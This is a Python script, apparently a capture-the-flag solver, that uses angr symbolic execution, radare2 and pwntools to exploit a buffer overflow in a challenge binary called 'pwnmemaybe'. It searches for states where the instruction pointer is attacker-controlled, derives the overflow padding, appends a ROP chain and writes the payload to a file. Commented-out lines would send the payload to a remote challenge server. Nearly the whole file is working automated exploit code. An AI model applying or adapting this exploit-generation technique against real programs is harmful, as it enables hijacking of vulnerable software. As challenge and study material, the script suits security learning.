from pwn import *
import r2pipe
import angr
import sys
context.log_level='INFO'
context(arch='amd64', os='linux')

def fully_symbolic(state, variable):
    '''
    check if a symbolic variable is completely symbolic
    so we know if some register is now symbolic
    '''

    for i in range(state.arch.bits):
        if not state.solver.symbolic(variable[i]):
            return False

    return True

def check_continuity(address, addresses, length):
    '''
    dumb way of checking if the region at 'address' contains 'length' amount of controlled
    memory.
    '''

    for i in range(length):
        if not address + i in addresses:
            return False

    return True

def find_symbolic_buffer(state, length):
    '''
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
    control

    Are we overwriting more memory that we should have been allowed to
    '''

    # get all the symbolic bytes from stdin
    stdin = state.posix.stdin

    sym_addrs = [ ]
    for _, symbol in state.solver.get_variables('file', stdin.ident):
        sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))

    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr

def build_ropchain():
    e = ELF("pwnmemaybe")
    write_target = e.bss()
    r = ROP([e])

    r.call('we_want_to_go_there', [0])

    # print(r.dump())
    return r

# p = remote('::1', 8000)
#p = remote('9000:ff:1ce:ff:216:3eff:fe8c:4a0c', 8000)
#p.recvuntil(b"Password: ")
#print("sending password")
#p.sendline(b"What I'm trying to do is to maximise the probability of the future being better")
#intro = p.recvline().decode()
#print("Waiting for binary")

done = 0
while True:
    
    if done == 1:
        break

    r2 = r2pipe.open('./pwnmemaybe')
    # r2.cmd('aa')

    r2.cmd('s main')
    main_symbol_str = r2.cmd('is.')
    main_addr = int(main_symbol_str.splitlines()[-1].split()[2], 16)

    project = angr.Project('./pwnmemaybe', selfmodifying_code=False, auto_load_libs=False)
    project.analyses.StaticHooker('libc.so.6')

    r2.cmd('s main')
    main_symbol_str = r2.cmd('is.')
    main_addr = int(main_symbol_str.splitlines()[-1].split()[2], 16)

    es = project.factory.entry_state(addr=main_addr)
    sm = project.factory.simulation_manager(es, save_unconstrained=True)

    extras = {angr.options.REVERSE_MEMORY_NAME_MAP, angr.options.TRACK_ACTION_HISTORY}
    es = project.factory.entry_state(add_options=extras)
    sm = project.factory.simulation_manager(es, save_unconstrained=True)

    # sys.set_int_max_str_digits(10000)
    exploitable_state = None
    print("Starting exploration")
    while exploitable_state is None:
        sm.step()
        if len(sm.unconstrained) > 0:
            print("found some unconstrained states, checking exploitability")
            for u in sm.unconstrained:
                if fully_symbolic(u, u.regs.pc):
                    exploitable_state = u
                    break

            # no exploitable state found, drop them
            sm.drop(stash='unconstrained')

    print("found a state which looks exploitable")
    ep = exploitable_state

    assert ep.solver.symbolic(ep.regs.pc), "PC must be symbolic at this point"
    print("success")

    ep.add_constraints(ep.regs.pc == ep.solver.BVV(bytes.fromhex("4142434445464748")))
    if ep.satisfiable():
        payload_template = ep.posix.dumps(0)
        padding = payload_template.split(b"\x48\x47\x46\x45\x44\x43\x42\x41")[0]

        r = build_ropchain()
        payload = padding + r.chain()

        with open("payload", 'wb') as fd:
            fd.write(payload)


    #correct_input = payload
    #print(base64.b64encode(correct_input).decode())
    #p.sendline(base64.b64encode(correct_input).decode())
    #msg = p.recvline()
    #print(msg)
    done += 1
    #print("Done:", done)
